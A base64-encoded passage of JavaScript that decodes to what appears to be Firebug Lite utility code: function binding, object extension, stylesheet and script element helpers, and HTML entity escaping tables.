JheShhcmd1bWVudHMpLCBmbiA9IGFyZ3Muc2hpZnQoKSwgb2JqZWN0ID0gYXJncy5zaGlmdCgpOw0KICAgcmV0dXJuIGZ1bmN0aW9uKCkgeyByZXR1cm4gZm4uYXBwbHkob2JqZWN0LCBhcnJheUluc2VydChjbG9uZUFycmF5KGFyZ3MpLCAwLCBhcmd1bWVudHMpKTsgfTsNCn07DQoNCnRoaXMuYmluZEZpeGVkID0gZnVuY3Rpb24oKSAvLyBmbiwgdGhpc09iamVjdCwgYXJncyA9PiB0aGlzT2JqZWN0LmZuKGFyZ3MpOw0Kew0KICAgIHZhciBhcmdzID0gY2xvbmVBcnJheShhcmd1bWVudHMpLCBmbiA9IGFyZ3Muc2hpZnQoKSwgb2JqZWN0ID0gYXJncy5zaGlmdCgpOw0KICAgIHJldHVybiBmdW5jdGlvbigpIHsgcmV0dXJuIGZuLmFwcGx5KG9iamVjdCwgYXJncyk7IH07DQp9Ow0KDQp0aGlzLmV4dGVuZCA9IGZ1bmN0aW9uKGwsIHIpDQp7DQogICAgdmFyIG5ld09iID0ge307DQogICAgZm9yICh2YXIgbiBpbiBsKQ0KICAgICAgICBuZXdPYltuXSA9IGxbbl07DQogICAgZm9yICh2YXIgbiBpbiByKQ0KICAgICAgICBuZXdPYltuXSA9IHJbbl07DQogICAgcmV0dXJuIG5ld09iOw0KfTsNCg0KdGhpcy5kZXNjZW5kID0gZnVuY3Rpb24ocHJvdG90eXBlUGFyZW50LCBjaGlsZFByb3BlcnRpZXMpDQp7DQogICAgZnVuY3Rpb24gcHJvdG9TZXR0ZXIoKSB7fTsNCiAgICBwcm90b1NldHRlci5wcm90b3R5cGUgPSBwcm90b3R5cGVQYXJlbnQ7DQogICAgdmFyIG5ld09iID0gbmV3IHByb3RvU2V0dGVyKCk7DQogICAgZm9yICh2YXIgbiBpbiBjaGlsZFByb3BlcnRpZXMpDQogICAgICAgIG5ld09iW25dID0gY2hpbGRQcm9wZXJ0aWVzW25dOw0KICAgIHJldHVybiBuZXdPYjsNCn07DQoNCnRoaXMuYXBwZW5kID0gZnVuY3Rpb24obCwgcikNCnsNCiAgICBmb3IgKHZhciBuIGluIHIpDQogICAgICAgIGxbbl0gPSByW25dOw0KICAgICAgICANCiAgICByZXR1cm4gbDsNCn07DQoNCnRoaXMua2V5cyA9IGZ1bmN0aW9uKG1hcCkgIC8vIEF0IGxlYXN0IHNvbWV0aW1lcyB0aGUga2V5cyB3aWxsIGJlIG9uIHVzZXItbGV2ZWwgd2luZG93IG9iamVjdHMNCnsNCiAgICB2YXIga2V5cyA9IFtdOw0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBtYXApICAvLyBlbnVtZXJhdGlvbiBpcyBzYWZlDQogICAgICAgICAgICBrZXlzLnB1c2gobmFtZSk7ICAgLy8gbmFtZSBpcyBzdHJpbmcsIHNhZmUNCiAgICB9DQogICAgY2F0Y2ggKGV4YykNCiAgICB7DQogICAgICAgIC8vIFNvbWV0aW1lcyB3ZSBnZXQgZXhjZXB0aW9ucyB0cnlpbmcgdG8gaXRlcmF0ZSBwcm9wZXJ0aWVzDQogICAgfQ0KDQogICAgcmV0dXJuIGtleXM7ICAvLyByZXR1cm4gaXMgc2FmZQ0KfTsNCg0KdGhpcy52YWx1ZXMgPSBmdW5jdGlvbihtYXApDQp7DQogICAgdmFyIHZhbHVlcyA9IFtdOw0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBtYXApDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhbHVlcy5wdXNoKG1hcFtuYW1lXSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCAoZXhjKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vIFNvbWV0aW1lcyB3ZSBnZXQgZXhjZXB0aW9ucyB0cnlpbmcgdG8gYWNjZXNzIHByb3BlcnRpZXMNCiAgICAgICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgibGliLnZhbHVlcyBGQUlMRUQgIiwgZXhjKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIChleGMpDQogICAgew0KICAgICAgICAvLyBTb21ldGltZXMgd2UgZ2V0IGV4Y2VwdGlvbnMgdHJ5aW5nIHRvIGl0ZXJhdGUgcHJvcGVydGllcw0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImxpYi52YWx1ZXMgRkFJTEVEICIsIGV4Yyk7DQogICAgfQ0KDQogICAgcmV0dXJuIHZhbHVlczsNCn07DQoNCnRoaXMucmVtb3ZlID0gZnVuY3Rpb24obGlzdCwgaXRlbSkNCnsNCiAgICBmb3IgKHZhciBpID0gMDsgaSA8IGxpc3QubGVuZ3RoOyArK2kpDQogICAgew0KICAgICAgICBpZiAobGlzdFtpXSA9PSBpdGVtKQ0KICAgICAgICB7DQogICAgICAgICAgICBsaXN0LnNwbGljZShpLCAxKTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgfQ0KfTsNCg0KdGhpcy5zbGljZUFycmF5ID0gZnVuY3Rpb24oYXJyYXksIGluZGV4KQ0Kew0KICAgIHZhciBzbGljZSA9IFtdOw0KICAgIGZvciAodmFyIGkgPSBpbmRleDsgaSA8IGFycmF5Lmxlbmd0aDsgKytpKQ0KICAgICAgICBzbGljZS5wdXNoKGFycmF5W2ldKTsNCg0KICAgIHJldHVybiBzbGljZTsNCn07DQoNCmZ1bmN0aW9uIGNsb25lQXJyYXkoYXJyYXksIGZuKQ0Kew0KICAgdmFyIG5ld0FycmF5ID0gW107DQoNCiAgIGlmIChmbikNCiAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFycmF5Lmxlbmd0aDsgKytpKQ0KICAgICAgICAgICBuZXdBcnJheS5wdXNoKGZuKGFycmF5W2ldKSk7DQogICBlbHNlDQogICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhcnJheS5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgbmV3QXJyYXkucHVzaChhcnJheVtpXSk7DQoNCiAgIHJldHVybiBuZXdBcnJheTsNCn0NCg0KZnVuY3Rpb24gZXh0ZW5kQXJyYXkoYXJyYXksIGFycmF5MikNCnsNCiAgIHZhciBuZXdBcnJheSA9IFtdOw0KICAgbmV3QXJyYXkucHVzaC5hcHBseShuZXdBcnJheSwgYXJyYXkpOw0KICAgbmV3QXJyYXkucHVzaC5hcHBseShuZXdBcnJheSwgYXJyYXkyKTsNCiAgIHJldHVybiBuZXdBcnJheTsNCn0NCg0KdGhpcy5leHRlbmRBcnJheSA9IGV4dGVuZEFycmF5Ow0KdGhpcy5jbG9uZUFycmF5ID0gY2xvbmVBcnJheTsNCg0KZnVuY3Rpb24gYXJyYXlJbnNlcnQoYXJyYXksIGluZGV4LCBvdGhlcikNCnsNCiAgIGZvciAodmFyIGkgPSAwOyBpIDwgb3RoZXIubGVuZ3RoOyArK2kpDQogICAgICAgYXJyYXkuc3BsaWNlKGkraW5kZXgsIDAsIG90aGVyW2ldKTsNCg0KICAgcmV0dXJuIGFycmF5Ow0KfQ0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5jcmVhdGVTdHlsZVNoZWV0ID0gZnVuY3Rpb24oZG9jLCB1cmwpDQp7DQogICAgLy9UT0RPOiB4eHhwZWRybw0KICAgIC8vdmFyIHN0eWxlID0gZG9jLmNyZWF0ZUVsZW1lbnROUygiaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIsICJzdHlsZSIpOw0KICAgIHZhciBzdHlsZSA9IHRoaXMuY3JlYXRlRWxlbWVudCgibGluayIpOw0KICAgIHN0eWxlLnNldEF0dHJpYnV0ZSgiY2hhcnNldCIsInV0Zi04Iik7DQogICAgc3R5bGUuZmlyZWJ1Z0lnbm9yZSA9IHRydWU7DQogICAgc3R5bGUuc2V0QXR0cmlidXRlKCJyZWwiLCAic3R5bGVzaGVldCIpOw0KICAgIHN0eWxlLnNldEF0dHJpYnV0ZSgidHlwZSIsICJ0ZXh0L2NzcyIpOw0KICAgIHN0eWxlLnNldEF0dHJpYnV0ZSgiaHJlZiIsIHVybCk7DQogICAgDQogICAgLy9UT0RPOiB4eHhwZWRybw0KICAgIC8vc3R5bGUuaW5uZXJIVE1MID0gdGhpcy5nZXRSZXNvdXJjZSh1cmwpOw0KICAgIHJldHVybiBzdHlsZTsNCn07DQoNCnRoaXMuYWRkU3R5bGVTaGVldCA9IGZ1bmN0aW9uKGRvYywgc3R5bGUpDQp7DQogICAgdmFyIGhlYWRzID0gZG9jLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIik7DQogICAgaWYgKGhlYWRzLmxlbmd0aCkNCiAgICAgICAgaGVhZHNbMF0uYXBwZW5kQ2hpbGQoc3R5bGUpOw0KICAgIGVsc2UNCiAgICAgICAgZG9jLmRvY3VtZW50RWxlbWVudC5hcHBlbmRDaGlsZChzdHlsZSk7DQp9Ow0KDQp0aGlzLmFwcGVuZFN0eWxlc2hlZXQgPSBmdW5jdGlvbihkb2MsIHVyaSkNCnsNCiAgICAvLyBNYWtlIHN1cmUgdGhlIHN0eWxlc2hlZXQgaXMgbm90IGFwcGVuZGVkIHR3aWNlLg0KICAgIGlmICh0aGlzLiQodXJpLCBkb2MpKQ0KICAgICAgICByZXR1cm47DQoNCiAgICB2YXIgc3R5bGVTaGVldCA9IHRoaXMuY3JlYXRlU3R5bGVTaGVldChkb2MsIHVyaSk7DQogICAgc3R5bGVTaGVldC5zZXRBdHRyaWJ1dGUoImlkIiwgdXJpKTsNCiAgICB0aGlzLmFkZFN0eWxlU2hlZXQoZG9jLCBzdHlsZVNoZWV0KTsNCn07DQoNCnRoaXMuYWRkU2NyaXB0ID0gZnVuY3Rpb24oZG9jLCBpZCwgc3JjKQ0Kew0KICAgIHZhciBlbGVtZW50ID0gZG9jLmNyZWF0ZUVsZW1lbnROUygiaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIsICJodG1sOnNjcmlwdCIpOw0KICAgIGVsZW1lbnQuc2V0QXR0cmlidXRlKCJ0eXBlIiwgInRleHQvamF2YXNjcmlwdCIpOw0KICAgIGVsZW1lbnQuc2V0QXR0cmlidXRlKCJpZCIsIGlkKTsNCiAgICBpZiAoIUZCVHJhY2UuREJHX0NPTlNPTEUpDQogICAgICAgIEZCTC51bndyYXBPYmplY3QoZWxlbWVudCkuZmlyZWJ1Z0lnbm9yZSA9IHRydWU7DQoNCiAgICBlbGVtZW50LmlubmVySFRNTCA9IHNyYzsNCiAgICBpZiAoZG9jLmRvY3VtZW50RWxlbWVudCkNCiAgICAgICAgZG9jLmRvY3VtZW50RWxlbWVudC5hcHBlbmRDaGlsZChlbGVtZW50KTsNCiAgICBlbHNlDQogICAgew0KICAgICAgICAvLyBTZWUgaXNzdWUgMTA3OSwgdGhlIHN2ZyB0ZXN0IGNhc2UgZ2l2ZXMgdGhpcyBlcnJvcg0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImxpYi5hZGRTY3JpcHQgZG9jIGhhcyBubyBkb2N1bWVudEVsZW1lbnQ6IiwgZG9jKTsNCiAgICB9DQogICAgcmV0dXJuIGVsZW1lbnQ7DQp9Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp0aGlzLmdldFN0eWxlID0gdGhpcy5pc0lFID8gDQogICAgZnVuY3Rpb24oZWwsIG5hbWUpDQogICAgew0KICAgICAgICByZXR1cm4gZWwuY3VycmVudFN0eWxlW25hbWVdIHx8IGVsLnN0eWxlW25hbWVdIHx8IHVuZGVmaW5lZDsNCiAgICB9DQogICAgOg0KICAgIGZ1bmN0aW9uKGVsLCBuYW1lKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGVsLm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZShlbCxudWxsKVtuYW1lXSANCiAgICAgICAgICAgIHx8IGVsLnN0eWxlW25hbWVdIHx8IHVuZGVmaW5lZDsNCiAgICB9Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gV2hpdGVzcGFjZSBhbmQgRW50aXR5IGNvbnZlcnNpb25zDQoNCnZhciBlbnRpdHlDb252ZXJzaW9uTGlzdHMgPSB0aGlzLmVudGl0eUNvbnZlcnNpb25MaXN0cyA9IHsNCiAgICBub3JtYWwgOiB7DQogICAgICAgIHdoaXRlc3BhY2UgOiB7DQogICAgICAgICAgICAnXHQnIDogJ1x1MjAwY1x1MjE5MicsDQogICAgICAgICAgICAnXG4nIDogJ1x1MjAwY1x1MDBiNicsDQogICAgICAgICAgICAnXHInIDogJ1x1MjAwY1x1MDBhYycsDQogICAgICAgICAgICAnICcgIDogJ1x1MjAwY1x1MDBiNycNCiAgICAgICAgfQ0KICAgIH0sDQogICAgcmV2ZXJzZSA6IHsNCiAgICAgICAgd2hpdGVzcGFjZSA6IHsNCiAgICAgICAgICAgICcmVGFiOycgOiAnXHQnLA0KICAgICAgICAgICAgJyZOZXdMaW5lOycgOiAnXG4nLA0KICAgICAgICAgICAgJ1x1MjAwY1x1MjE5MicgOiAnXHQnLA0KICAgICAgICAgICAgJ1x1MjAwY1x1MDBiNicgOiAnXG4nLA0KICAgICAgICAgICAgJ1x1MjAwY1x1MDBhYycgOiAnXHInLA0KICAgICAgICAgICAgJ1x1MjAwY1x1MDBiNycgOiAnICcNCiAgICAgICAgfQ0KICAgIH0NCn07DQoNCnZhciBub3JtYWwgPSBlbnRpdHlDb252ZXJzaW9uTGlzdHMubm9ybWFsLA0KICAgIHJldmVyc2UgPSBlbnRpdHlDb252ZXJzaW9uTGlzdHMucmV2ZXJzZTsNCg0KZnVuY3Rpb24gYWRkRW50aXR5TWFwVG9MaXN0KGNjb2RlLCBlbnRpdHkpDQp7DQogICAgdmFyIGxpc3RzID0gQXJyYXkucHJvdG90eXBlLnNsaWNlLmNhbGwoYXJndW1lbnRzLCAyKSwNCiAgICAgICAgbGVuID0gbGlzdHMubGVuZ3RoLA0KICAgICAgICBjaCA9IFN0cmluZy5mcm9tQ2hhckNvZGUoY2NvZGUpOw0KICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbGVuOyBpKyspDQogICAgew0KICAgICAgICB2YXIgbGlzdCA9IGxpc3RzW2ldOw0KICAgICAgICBub3JtYWxbbGlzdF09bm9ybWFsW2xpc3RdIHx8IHt9Ow0KICAgICAgICBub3JtYWxbbGlzdF1bY2hdID0gJyYnICsgZW50aXR5ICsgJzsnOw0KICAgICAgICByZXZlcnNlW2xpc3RdPXJldmVyc2VbbGlzdF0gfHwge307DQogICAgICAgIHJldmVyc2VbbGlzdF1bJyYnICsgZW50aXR5ICsgJzsnXSA9IGNoOw0KICAgIH0NCn07DQoNCnZhciBlID0gYWRkRW50aXR5TWFwVG9MaXN0LA0KICAgIHdoaXRlID0gJ3doaXRlc3BhY2UnLA0KICAgIHRleHQgPSAndGV4dCcsDQogICAgYXR0ciA9ICdhdHRyaWJ1dGVzJywNCiAgICBjc3MgPSAnY3NzJywNCiAgICBlZGl0b3IgPSAnZWRpdG9yJzsNCg0KZSgweDAwMjIsICdxdW90JywgYXR0ciwgY3NzKTsNCmUoMHgwMDI2LCAnYW1wJywgYXR0ciwgdGV4dCwgY3NzKTsNCmUoMHgwMDI3LCAnYXBvcycsIGNzcyk7DQplKDB4MDAzYywgJ2x0JywgYXR0ciwgdGV4dCwgY3NzKTsNCmUoMHgwMDNlLCAnZ3QnLCBhdHRyLCB0ZXh0LCBjc3MpOw0KZSgweGE5LCAnY29weScsIHRleHQsIGVkaXRvcik7DQplKDB4YWUsICdyZWcnLCB0ZXh0LCBlZGl0b3IpOw0KZSgweDIxMjIsICd0cmFkZScsIHRleHQsIGVkaXRvcik7DQoNCi8vIFNlZSBodHRwOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL0Rhc2gNCmUoMHgyMDEyLCAnIzgyMTAnLCBhdHRyLCB0ZXh0LCBlZGl0b3IpOyAvLyBmaWd1cmUgZGFzaA0KZSgweDIwMTMsICduZGFzaCcsIGF0dHIsIHRleHQsIGVkaXRvcik7IC8vIGVuIGRhc2gNCmUoMHgyMDE0LCAnbWRhc2gnLCBhdHRyLCB0ZXh0LCBlZGl0b3IpOyAvLyBlbSBkYXNoDQplKDB4MjAxNSwgJyM4MjEzJywgYXR0ciwgdGV4dCwgZWRpdG9yKTsgLy8gaG9yaXpvbnRhbCBiYXINCg0KZSgweDAwYTAsICduYnNwJywgYXR0ciwgdGV4dCwgd2hpdGUsIGVkaXRvcik7DQplKDB4MjAwMiwgJ2Vuc3AnLCBhdHRyLCB0ZXh0LCB3aGl0ZSwgZWRpdG9yKTsNCmUoMHgyMDAzLCAnZW1zcCcsIGF0dHIsIHRleHQsIHdoaXRlLCBlZGl0b3IpOw0KZSgweDIwMDksICd0aGluc3AnLCBhdHRyLCB0ZXh0LCB3aGl0ZSwgZWRpdG9yKTsNCmUoMHgyMDBjLCAnenduaicsIGF0dHIsIHRleHQsIHdoaXRlLCBlZGl0b3IpOw0KZSgweDIwMGQsICd6d2onLCBhdHRyLCB0ZXh0LCB3aGl0ZSwgZWRpdG9yKTsNCmUoMHgyMDBlLCAnbHJtJywgYXR0ciwgdGV4dCwgd2hpdGUsIGVkaXRvcik7DQplKDB4MjAwZiwgJ3JsbScsIGF0dHIsIHRleHQsIHdoaXRlLCBlZGl0b3IpOw0KZSgweDIwMGIsICcjODIwMycsIGF0dHIsIHRleHQsIHdoaXRlLCBlZGl0b3IpOyAvLyB6ZXJvLXdpZHRoIHNwYWNlIChaV1NQKQ0KDQovLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gRW50aXR5IGVzY2FwaW5nDQoNCnZhciBlbnRpdHlDb252ZXJzaW9uUmVnZXhlcyA9IHsNCiAgICAgICAgbm9ybWFsIDoge30sDQogICAgICAgIHJldmVyc2UgOiB7fQ0KICAgIH07DQoNCnZhciBlc2NhcGVFbnRpdGllc1JlZ0V4ID0gew0KICAgIG5vcm1hbCA6IGZ1bmN0aW9uKGxpc3QpDQogICAgew0KICAgICAgICB2YXIgY2hhcnMgPSBbXTsNCiAgICAgICAgZm9yICggdmFyIGNoIGluIGxpc3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIGNoYXJzLnB1c2goY2gpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBuZXcgUmVnRXhwKCcoWycgKyBjaGFycy5qb2luKCcnKSArICddKScsICdnbScpOw0KICAgIH0sDQogICAgcmV2ZXJzZSA6IGZ1bmN0aW9uKGxpc3QpDQogICAgew0KICAgICAgICB2YXIgY2hhcnMgPSBbXTsNCiAgICAgICAgZm9yICggdmFyIGNoIGluIGxpc3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIGNoYXJzLnB1c2goY2gpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBuZXcgUmVnRXhwKCcoJyArIGNoYXJzLmpvaW4oJ3wnKSArICcpJywgJ2dtJyk7DQogICAgfQ0KfTsNCg0KZnVuY3Rpb24gZ2V0RXNjYXBlUmVnZXhwKGRpcmVjdGlvbiwgbGlzdHMpDQp7DQogICAgdmFyIG5hbWUgPSAnJywgcmU7DQogICAgdmFyIGdyb3VwcyA9IFtdLmNvbmNhdChsaXN0cyk7DQogICAgZm9yIChpID0gMDsgaSA8IGdyb3Vwcy5sZW5ndGg7IGkrKykNCiAgICB7DQogICAgICAgIG5hbWUgKz0gZ3JvdXBzW2ldLmdyb3VwOw0KICAgIH0NCiAgICByZSA9IGVudGl0eUNvbnZlcnNpb25SZWdleGVzW2RpcmVjdGlvbl1bbmFtZV07DQogICAgaWYgKCFyZSkNCiAgICB7DQogICAgICAgIHZhciBsaXN0ID0ge307DQogICAgICAgIGlmIChncm91cHMubGVuZ3RoID4gMSkNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yICggdmFyIGkgPSAwOyBpIDwgZ3JvdXBzLmxlbmd0aDsgaSsrKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBhTGlzdCA9IGVudGl0eUNvbnZlcnNpb25MaXN0c1tkaXJlY3Rpb25dW2dyb3Vwc1tpXS5ncm91cF07DQogICAgICAgICAgICAgICAgZm9yICggdmFyIGl0ZW0gaW4gYUxpc3QpDQogICAgICAgICAgICAgICAgICAgIGxpc3RbaXRlbV0gPSBhTGlzdFtpdGVtXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIGlmIChncm91cHMubGVuZ3RoPT0xKQ0KICAgICAgICB7DQogICAgICAgICAgICBsaXN0ID0gZW50aXR5Q29udmVyc2lvbkxpc3RzW2RpcmVjdGlvbl1bZ3JvdXBzWzBdLmdyb3VwXTsgLy8gZmFzdGVyIGZvciBzcGVjaWFsIGNhc2UNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGxpc3QgPSB7fTsgLy8gcGVyaGFwcyBzaG91bGQgcHJpbnQgb3V0IGFuIGVycm9yIGhlcmU/DQogICAgICAgIH0NCiAgICAgICAgcmUgPSBlbnRpdHlDb252ZXJzaW9uUmVnZXhlc1tkaXJlY3Rpb25dW25hbWVdID0gZXNjYXBlRW50aXRpZXNSZWdFeFtkaXJlY3Rpb25dKGxpc3QpOw0KICAgIH0NCiAgICByZXR1cm4gcmU7DQp9Ow0KDQpmdW5jdGlvbiBjcmVhdGVTaW1wbGVFc2NhcGUobmFtZSwgZGlyZWN0aW9uKQ0Kew0KICAgIHJldHVybiBmdW5jdGlvbih2YWx1ZSkNCiAgICB7DQogICAgICAgIHZhciBsaXN0ID0gZW50aXR5Q29udmVyc2lvbkxpc3RzW2RpcmVjdGlvbl1bbmFtZV07DQogICAgICAgIHJldHVybiBTdHJpbmcodmFsdWUpLnJlcGxhY2UoDQogICAgICAgICAgICAgICAgZ2V0RXNjYXBlUmVnZXhwKGRpcmVjdGlvbiwgew0KICAgICAgICAgICAgICAgICAgICBncm91cCA6IG5hbWUsDQogICAgICAgICAgICAgICAgICAgIGxpc3QgOiBsaXN0DQogICAgICAgICAgICAgICAgfSksDQogICAgICAgICAgICAgICAgZnVuY3Rpb24oY2gpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gbGlzdFtjaF07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgKTsNCiAgICB9Ow0KfTsNCg0KZnVuY3Rpb24gZXNjYXBlR3JvdXBzRm9yRW50aXRpZXMoc3RyLCBsaXN0cykNCnsNCiAgICBsaXN0cyA9IFtdLmNvbmNhdChsaXN0cyk7DQogICAgdmFyIHJlID0gZ2V0RXNjYXBlUmVnZXhwKCdub3JtYWwnLCBsaXN0cyksDQogICAgICAgIHNwbGl0ID0gU3RyaW5nKHN0cikuc3BsaXQocmUpLA0KICAgICAgICBsZW4gPSBzcGxpdC5sZW5ndGgsDQogICAgICAgIHJlc3VsdHMgPSBbXSwNCiAgICAgICAgY3VyLCByLCBpLCByaSA9IDAsIGwsIGxpc3QsIGxhc3QgPSAnJzsNCiAgICBpZiAoIWxlbikNCiAgICAgICAgcmV0dXJuIFsgew0KICAgICAgICAgICAgc3RyIDogU3RyaW5nKHN0ciksDQogICAgICAgICAgICBncm91cCA6ICcnLA0KICAgICAgICAgICAgbmFtZSA6ICcnDQogICAgICAgIH0gXTsNCiAgICBmb3IgKGkgPSAwOyBpIDwgbGVuOyBpKyspDQogICAgew0KICAgICAgICBjdXIgPSBzcGxpdFtpXTsNCiAgICAgICAgaWYgKGN1ciA9PSAnJykNCiAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICBmb3IgKGwgPSAwOyBsIDwgbGlzdHMubGVuZ3RoOyBsKyspDQogICAgICAgIHsNCiAgICAgICAgICAgIGxpc3QgPSBsaXN0c1tsXTsNCiAgICAgICAgICAgIHIgPSBlbnRpdHlDb252ZXJzaW9uTGlzdHMubm9ybWFsW2xpc3QuZ3JvdXBdW2N1cl07DQogICAgICAgICAgICAvLyBpZiAoY3VyID09ICcgJyAmJiBsaXN0Lmdyb3VwID09ICd3aGl0ZXNwYWNlJyAmJiBsYXN0ID09ICcgJykgLy8gb25seSBzaG93IGZvciBydW5zIG9mIG1vcmUgdGhhbiBvbmUgc3BhY2UNCiAgICAgICAgICAgIC8vICAgICByID0gJyAnOw0KICAgICAgICAgICAgaWYgKHIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmVzdWx0c1tyaV0gPSB7DQogICAgICAgICAgICAgICAgICAgICdzdHInIDogciwNCiAgICAgICAgICAgICAgICAgICAgJ2NsYXNzJyA6IGxpc3RbJ2NsYXNzJ10sDQogICAgICAgICAgICAgICAgICAgICdleHRyYScgOiBsaXN0LmV4dHJhW2N1cl0gPyBsaXN0WydjbGFzcyddDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKyBsaXN0LmV4dHJhW2N1cl0gOiAnJw0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgLy8gbGFzdD1jdXI7DQogICAgICAgIGlmICghcikNCiAgICAgICAgICAgIHJlc3VsdHNbcmldID0gew0KICAgICAgICAgICAgICAgICdzdHInIDogY3VyLA0KICAgICAgICAgICAgICAgICdjbGFzcycgOiAnJywNCiAgICAgICAgICAgICAgICAnZXh0cmEnIDogJycNCiAgICAgICAgICAgIH07DQogICAgICAgIHJpKys7DQogICAgfQ0KICAgIHJldHVybiByZXN1bHRzOw0KfTsNCg0KdGhpcy5lc2NhcGVHcm91cHNGb3JFbnRpdGllcyA9IGVzY2FwZUdyb3Vwc0ZvckVudGl0aWVzOw0KDQoNCmZ1bmN0aW9uIHVuZXNjYXBlRW50aXRpZXMoc3RyLCBsaXN0cykNCnsNCiAgICB2YXIgcmUgPSBnZXRFc2NhcGVSZWdleHAoJ3JldmVyc2UnLCBsaXN0cyksDQogICAgICAgIHNwbGl0ID0gU3RyaW5nKHN0cikuc3BsaXQocmUpLA0KICAgICAgICBsZW4gPSBzcGxpdC5sZW5ndGgsDQogICAgICAgIHJlc3VsdHMgPSBbXSwNCiAgICAgICAgY3VyLCByLCBpLCByaSA9IDAsIGwsIGxpc3Q7DQogICAgaWYgKCFsZW4pDQogICAgICAgIHJldHVybiBzdHI7DQogICAgbGlzdHMgPSBbXS5jb25jYXQobGlzdHMpOw0KICAgIGZvciAoaSA9IDA7IGkgPCBsZW47IGkrKykNCiAgICB7DQogICAgICAgIGN1ciA9IHNwbGl0W2ldOw0KICAgICAgICBpZiAoY3VyID09ICcnKQ0KICAgICAgICAgICAgY29udGludWU7DQogICAgICAgIGZvciAobCA9IDA7IGwgPCBsaXN0cy5sZW5ndGg7IGwrKykNCiAgICAgICAgew0KICAgICAgICAgICAgbGlzdCA9IGxpc3RzW2xdOw0KICAgICAgICAgICAgciA9IGVudGl0eUNvbnZlcnNpb25MaXN0cy5yZXZlcnNlW2xpc3QuZ3JvdXBdW2N1cl07DQogICAgICAgICAgICBpZiAocikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXN1bHRzW3JpXSA9IHI7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFyKQ0KICAgICAgICAgICAgcmVzdWx0c1tyaV0gPSBjdXI7DQogICAgICAgIHJpKys7DQogICAgfQ0KICAgIHJldHVybiByZXN1bHRzLmpvaW4oJycpIHx8ICcnOw0KfTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFN0cmluZyBlc2NhcGluZw0KDQp2YXIgZXNjYXBlRm9yVGV4dE5vZGUgPSB0aGlzLmVzY2FwZUZvclRleHROb2RlID0gY3JlYXRlU2ltcGxlRXNjYXBlKCd0ZXh0JywgJ25vcm1hbCcpOw0KdmFyIGVzY2FwZUZvckh0bWxFZGl0b3IgPSB0aGlzLmVzY2FwZUZvckh0bWxFZGl0b3IgPSBjcmVhdGVTaW1wbGVFc2NhcGUoJ2VkaXRvcicsICdub3JtYWwnKTsNCnZhciBlc2NhcGVGb3JFbGVtZW50QXR0cmlidXRlID0gdGhpcy5lc2NhcGVGb3JFbGVtZW50QXR0cmlidXRlID0gY3JlYXRlU2ltcGxlRXNjYXBlKCdhdHRyaWJ1dGVzJywgJ25vcm1hbCcpOw0KdmFyIGVzY2FwZUZvckNzcyA9IHRoaXMuZXNjYXBlRm